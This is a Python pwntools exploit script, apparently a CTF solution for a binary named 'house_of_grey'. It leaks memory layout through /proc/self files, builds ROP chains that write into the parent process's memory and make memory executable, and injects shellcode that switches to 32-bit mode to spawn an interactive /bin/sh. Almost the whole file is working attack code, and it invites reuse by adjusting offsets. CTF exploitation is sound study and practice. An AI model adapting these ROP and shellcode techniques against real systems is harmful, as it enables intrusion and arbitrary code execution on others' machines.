#!/usr/bin/python

'''
the target elf I test is not stripped.
So, if you want to use this script, just fix some offset values.
'''

from pwn import *
import sys

debug = 1
libc = None
p = None

if debug:
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	elf = ELF("./house_of_grey")
	p = process("./house_of_grey")
	context.log_level = "debug"
else:
	libc = ELF("libc.so.6")
	#replace your target here
	p = remote('192.168.30.202', 10000)
	#context.log_level = "debug"

def find_something(p, something):
	p.recvuntil("Exit\n")
	p.sendline("1")
	p.recvuntil("what are you finding?\n")
	p.sendline(something)

def locate_yourself(p, location):
	p.recvuntil("Exit\n")
	p.sendline("2")
	p.recvuntil("Where are you?\n")
	p.sendline(str(location))

def get_something(p, count):
	p.recvuntil("Exit\n")
	p.sendline("3")
	p.recvuntil("How many things do you want to get?\n")
	p.sendline(str(count))

def give_something(p, content):
	p.recvuntil("Exit\n")
	p.sendline("4")
	p.recvuntil("content: \n")
	p.sendline(content)

def get_parent_pid(p):
	find_something(p, "/proc/self/status")
	locate_yourself(p, 0)
	get_something(p, 100)
	p.recvuntil("You get something:\n")
	data = p.recv(100)
	flag = 0

	for line in data.split("\n"):
		if "PPid" in line:
			ppid = int(line.split()[1], 10)
			print "\n[+] Got parent's pid: ", ppid
			flag = 1
			return ppid
	if flag == 0:
		print "[-] Can't get parent's pid"
		sys.exit()

def get_addresses(p):
	find_something(p, "/proc/self/maps")
	locate_yourself(p, 0)
	get_something(p, 3000)
	p.recvuntil("You get something:\n")
	data = p.recv(0x700)

	#the addresses we need
	parent_stack_addr = None
	elf_addr = None
	libc_addr = None
	mmap_addr = None

	'''
	we must find the mmap address, but in /proc/self/maps,
	we can't find the text 'mapped', so we assume the mmap 
	area is just behind the heap area.
	'''
	mem = data.split("\n")
	length = len(mem)
	for i in xrange(0, length):
		if "[stack]" in mem[i]:
			parent_stack_addr = int(mem[i].split("-")[0], 16)
			print "[+] parent stack address: " + hex(parent_stack_addr)

		#here, replace your path
		if "r-xp" in mem[i] and "house_of_grey" in mem[i]:
			elf_addr = int(mem[i].split("-")[0], 16)
			print "[+] ELF adderss: " + hex(elf_addr)

		if "r-xp" in mem[i] and "/lib/x86_64-linux-gnu/libc-2.23.so" in mem[i]:
			libc_addr = int(mem[i].split("-")[0], 16)
			print "[+] Libc adderss: " + hex(libc_addr)

		if "[heap]" in mem[i]:
			mmap_addr = int(mem[i+1].split("-")[0], 16)
			print "[+] mmap address: " + hex(mmap_addr)

	if None in (parent_stack_addr, elf_addr, libc_addr, mmap_addr):
		print "[-] Failed to find addresses from memory map. Exit...."
		sys.exit()

	return parent_stack_addr, elf_addr, libc_addr, mmap_addr

def get_child_stack_address(p):
	'''
	test on ubuntun 16.04.
	just dump the stack data and then find 
	the mmap_addr
	'''
	find_something(p, "/proc/self/mem")
	#see where your stack frame exactly is.
	locate_yourself(p, str(parent_stack_addr + 0x1f000))
	get_something(p, 8192+0x1000)
	p.recvuntil("You get something:\n")

	child_stack_addr = None
	ret_from_waitpid = None
	offset = None
	mem = []

	for i in xrange(0, 8192, 8):
		#print i
		data = u64(p.recv(8))
		mem.append( (parent_stack_addr + 0x1f000 + i, data) )
		if data == mmap_addr:
			#print hex(data)
			break

	i = len(mem)
	print "[+] Find child stack address."
	offset = mem[i-2][1]
	print "[+] offset: " + hex(offset)
	ret_from_waitpid = mem[i-10][0] 
	
	
	child_stack_addr = mmap_addr + offset
	print "[+] child stack address: " + hex(child_stack_addr)
	print "[+] ret_from_waitpid: " + hex(ret_from_waitpid)
	ret_from_read = child_stack_addr - (0x7fffe7efb3c0 - 0x7fffe7efb328) 
	print "[+] ret_from_read: " + hex(ret_from_read)

	return child_stack_addr, ret_from_waitpid, ret_from_read

def dump_memory(p):
	'''
	if you don't get the libc,
	you must find a way to dump libc.
	'''
	pass

def exploit(p):
	#some gadgets
	pop_rdi = elf_addr + 0x1683
	pop_rsi_r15 = elf_addr + 0x1681
	pop_rdx = libc_addr + 0x1b92
	pop_rax = libc_addr + 0x33544
	#the function's addresses we need
	close_plt = elf_addr + 0xc00
	#print "close: " + hex(close_plt)
	read_plt = elf_addr + 0xc08
	open_plt = elf_addr + 0xc48
	lseek_plt = elf_addr + 0xbf0
	write_plt = elf_addr + 0xbc8
	exit_plt = elf_addr + 0xc60
	#just test my rop chain
	binsh_addr = libc_addr + next(libc.search("/bin/sh"))
	puts_addr = libc_addr + libc.symbols['puts']
	syscall = libc_addr + 0xF722E
	#puts("/bin/sh")
	#rop_chain = p64(pop_rdi) + p64(binsh_addr) + p64(puts_addr)
	workspace = child_stack_addr - 0x8000
	#close(2) close fd 2
	rop_chain = p64(pop_rdi) + p64(2) + p64(close_plt)
	#read(0, workspace, 16) read filename
	#0x7fffe868e5c0
	rop_chain += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(workspace) *2 
	rop_chain += p64(pop_rdx) + p64(16) + p64(read_plt)
	#open("/proc/[ppid]/mem", 2)
	rop_chain += p64(pop_rdi) + p64(workspace) + p64(pop_rsi_r15) 
	rop_chain += p64(2) * 2 + p64(open_plt)
	#read(0, workspace + 0x1000, 0x100)
	rop_chain += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(workspace + 0x1000)*2
	rop_chain += p64(pop_rdx) + p64(0x100) + p64(read_plt)

	#lseek(2, ret_from_waitpid, 0)
	rop_chain += p64(pop_rdi) + p64(2) + p64(pop_rsi_r15) + p64(ret_from_waitpid) * 2 
	rop_chain += p64(pop_rdx) + p64(0) + p64(lseek_plt)
	#write(2, ret_from_waitpid+0x1000, 0x100)
	rop_chain += p64(pop_rdi) + p64(2) + p64(pop_rsi_r15) + p64(workspace + 0x1000) * 2
	rop_chain += p64(pop_rdx) + p64(0x100) + p64(write_plt)
	
	#exit(0)
	rop_chain += p64(pop_rdi) + p64(0) + p64(exit_plt)
	rop_chain = rop_chain.ljust(0x1ff, '\x00')

	payload = '/proc/self/cmdline'.ljust(24, '\x00') + p64(ret_from_read)
	find_something(p, payload)
	raw_input("go")
	give_something(p, rop_chain)
	print "[.] Sending the first rop chain...\n"
	#print p.recvuntil("/bin/sh")
	#7fffe86145a8
	p.send("/proc/%d/mem\x00" % ppid)

	'''
	this rop chain does 2 things:
	1. calling mprotect to make bss executable
	2. read shellcode to bss section
	'''
	bss_addr = elf_addr + 0x202000
	add_rax_1 = libc_addr + 0xabf40
	#mprotect(bss_addr, 0x1000, 7)
	rop_chain2 = p64(pop_rax) + p64(9) + p64(add_rax_1) + p64(pop_rdi) + p64(bss_addr)
	rop_chain2 += p64(pop_rsi_r15) + p64(0x1000) *2 + p64(pop_rdx) + p64(7) + p64(syscall)
	#puts("/bin/sh")
	#just test rop chain
	rop_chain2 += p64(pop_rdi) + p64(binsh_addr) + p64(puts_addr)
	#read(0, bss_addr + 0x200, 0x100)
	rop_chain2 += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15)
	rop_chain2 += p64(bss_addr + 0x200) * 2 + p64(pop_rdx) + p64(0x100) + p64(syscall)
	#return to bss to execute shellcode
	rop_chain2 += p64(bss_addr + 0x200)
	#print rop_chain2

	'''
	mmap a executable area and read
	shellcode to it.
	Why we should do this?
	We change to 32bit mode from 64bit mode to execute
	shellcode, we must make sure that eip and are 32bit
	pointers.
	'''
	sc = '''
		mov rax, 9
		mov rdi, 0x600000
		mov rsi, 0x1000
		mov rdx, 7
		mov r10, 0x4022
		mov r8, -1
		mov r9, 0
		syscall

		mov rax, 0
		xor rdi, rdi
		mov rsi, 0x600000
		mov rdx, 0x100
		syscall

		xor rsp, rsp
		mov rsp, 0x600900
		mov DWORD PTR [esp+4], 0x23
		mov DWORD PTR [esp], 0x600000
		retf
		 '''
	
	print "[.] Sending the second rop chain...\n"
	#raw_input("go")
	p.sendline(rop_chain2.ljust(0xff, '\x00'))
	print p.recvuntil("/bin/sh")
	payload = asm(sc, os = 'linux', arch = 'amd64')
	for i in payload:
		assert (i != '\x0a')
	print "[.] Sending the first payload...\n"
	p.sendline(payload.ljust(0xff, '\x00'))

	

	payload2 = asm(shellcraft.i386.linux.sh(), arch = 'x86')
	print "[.] Sending the second payload...\n"
	p.sendline(payload2.ljust(0xff, '\x00'))

	print "[+] Exploit success!"
	p.interactive()

p.recvuntil("Do you want to help me build my room? Y/n?\n")
p.sendline("y")

ppid = get_parent_pid(p)
print "[+] Stage 1 finished!\n"

parent_stack_addr, elf_addr, libc_addr, mmap_addr = get_addresses(p)
print "[+] Stage 2 finished!\n"

child_stack_addr, ret_from_waitpid, ret_from_read = get_child_stack_address(p)
print "[+] Stage 3 finished!\n"

exploit(p)
print "[+] Stage 4 finished!\n"



